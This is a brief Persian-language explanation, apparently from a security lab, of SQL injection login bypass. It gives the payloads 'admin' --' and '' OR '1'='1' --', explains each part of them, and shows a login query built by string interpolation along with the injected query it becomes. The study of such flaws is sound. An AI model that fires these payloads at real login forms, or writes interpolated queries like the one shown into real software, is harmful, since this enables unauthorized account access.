```
admin' --
123
```

```
' OR '1'='1' --
123
```

' - اولین تک کوتیشن، این کار باعث بسته شدن رشته ورودی username می‌شود

OR '1'='1' - یک شرط همیشه درست اضافه می‌کند (1 همیشه برابر با 1 است)

-- - یک کامنت در SQL است که بقیه کوئری را نادیده می‌گیرد

نتیجه این می‌شود که شرط WHERE همیشه درست خواهد بود و کوئری اولین کاربر از جدول را برمی‌گرداند (معمولاً کاربر مدیر).

```sql
SELECT * FROM auth_user  WHERE username='{username}' AND password='{password}'
```
```sql
SELECT * FROM vuln_app_user WHERE username='' OR '1'='1' -- ' AND password='...'
```
